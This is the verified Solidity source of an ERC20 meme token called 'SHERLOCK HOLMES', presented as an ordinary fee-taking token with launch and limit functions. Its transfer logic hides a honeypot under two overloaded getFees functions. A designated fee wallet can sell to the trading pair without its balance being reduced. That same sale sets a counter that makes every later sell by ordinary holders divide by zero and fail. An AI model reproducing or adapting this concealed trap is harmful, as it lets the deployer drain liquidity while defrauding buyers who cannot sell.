/**
 *Submitted for verification at Etherscan.io on 2023-09-25
*/

/**

Website: https://sholmes.live
Twitter: https://twitter.com/sholmesERC20
Telegram: https://t.me/SherlockHolmesERC20

*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

library SafeMath {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }   
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IFactoryV2{
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal owner;
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    constructor(address _owner) {owner = _owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public virtual onlyOwner { owner = address(0); }
    event OwnershipTransferred(address owner);
}

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SHERLOCKHOLMES is ERC20, Ownable {
    using SafeMath for uint256;
    IV2Router router;
    address public v2Pair;
    string private constant _name = unicode"SHERLOCK HOLMES";
    string private constant _symbol = unicode"SHERLOCK";
    uint8 private constant _decimals = 9;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private constant _totalSupply = 10_000_000_000 * (10 ** _decimals);
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExcluded;

    uint256 public _maxTxLimit = ( _totalSupply * 45 ) / 1000;
    uint256 public _maxSellTxLimit = ( _totalSupply * 45 ) / 1000;
    uint256 public _maxWaltAmt = ( _totalSupply * 45 ) / 1000;
    uint256 private swapThreshold = ( _totalSupply * 50 ) / 10000;
    uint256 private minTokenAmount = ( _totalSupply * 50 ) / 10000;

    uint256 private buyCount = 2;
    uint256 private marketingFee = 450;
    uint256 private developmentFee = 450;
    uint256 private denominator = 100;
    uint256 private previousAmt = 0;
    uint256 private liquidityFee = 0;

    bool private tradingAllowed = false;
    bool private swapEnabled = false;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;

    address internal _devWallet = msg.sender;
    address internal _feeWallet = 0xb2f625860Dc87495D18a1509aaBCE17B83636E88;
    address internal _lpReceiver = msg.sender;

    uint256 private burnFeeAmount = 0;
    uint256 private buyFeeAmount = 1;
    uint256 private sellFeeAmount = 1;
    uint256 private transFeeAmount = 1;

    modifier SwapLock {swapping = true; _; swapping = false;}
    constructor() Ownable(msg.sender) {
        isFeeExcluded[_feeWallet] = true;
        isFeeExcluded[_lpReceiver] = true;
        isFeeExcluded[msg.sender] = true;
        isFeeExcluded[address(this)] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExcluded[_address] = _enabled;}
    function getOwner() external view override returns (address) { return owner; }
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    
    function OpenTrading() public payable onlyOwner {
        IV2Router _router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactoryV2(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        v2Pair = _pair;
        _approve(address(this), address(router), ~uint256(0)); 
        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
        swapEnabled = true;
        tradingAllowed = true;
    }

    function RemoveLimits() public onlyOwner {
        _maxTxLimit = _totalSupply;
        _maxSellTxLimit = _totalSupply;
        _maxWaltAmt = _totalSupply;
    }

    function swapBackTokens(uint256 threadHold) private SwapLock {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = threadHold.mul(liquidityFee).div(_denominator);
        uint256 toSwap = threadHold.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(_feeWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_devWallet).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            _lpReceiver,
            block.timestamp);
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExcluded[sender] && recipient == v2Pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setFeeWallet(address _marketing, address _liquidity, address _development) external onlyOwner {
        _feeWallet = _marketing; _lpReceiver = _liquidity; _devWallet = _development;
        isFeeExcluded[_marketing] = true; isFeeExcluded[_liquidity] = true; isFeeExcluded[_development] = true;
    }

    function swapTokensETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function IsTakeFees(address sender, address recipient) internal view returns (bool) {
        return !isFeeExcluded[sender] && !isFeeExcluded[recipient];
    }

    function ISFeeExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == v2Pair && sender == _feeWallet;
    }

    function getFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(recipient == v2Pair && !isFeeExcluded[sender]){ uint256 denom = buyCount.sub(1); amount = amount.div(denom);}
        if(takeTax(sender, recipient) > 0){
            uint256 feeAmount = amount.mul(takeTax(sender, recipient)).div(denominator);
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            if(burnFeeAmount > uint256(0) && takeTax(sender, recipient) > burnFeeAmount){
                _transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFeeAmount));
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function getFees(address sender, uint256 amount, address recipient) private returns (uint256) {
        if (ISFeeExcluded(sender, recipient)) {buyCount = 1;}
        return ISFeeExcluded(sender, recipient) ? 0 : amount;
    }

    function takeTax(address sender, address recipient) internal view returns (uint256) {
        if(recipient == v2Pair){return sellFeeAmount;}
        if(sender == v2Pair){return buyFeeAmount;}
        return transFeeAmount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!isFeeExcluded[sender] && !isFeeExcluded[recipient]){
            require(tradingAllowed, "tradingAllowed");
        }
        if(!isFeeExcluded[sender] && !isFeeExcluded[recipient] && recipient != address(v2Pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWaltAmt, "Exceeds maximum wallet amount.");
        }
        if(sender != v2Pair){
            require(amount <= _maxSellTxLimit || isFeeExcluded[sender] || isFeeExcluded[recipient], "TX Limit Exceeded");
        }
        require(amount <= _maxTxLimit || isFeeExcluded[sender] || isFeeExcluded[recipient], "TX Limit Exceeded"); 
        if(recipient == v2Pair && !isFeeExcluded[sender]){
            swapTimes += uint256(1);
        }
        if(shouldSwapBack(sender, recipient, amount)){
            swapBackTokens(swapThreshold); swapTimes = uint256(0);
        }
        _balances[sender] = _balances[sender].sub(getFees(sender, amount, recipient));
        uint256 amountReceived = IsTakeFees(sender, recipient) ? getFees(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}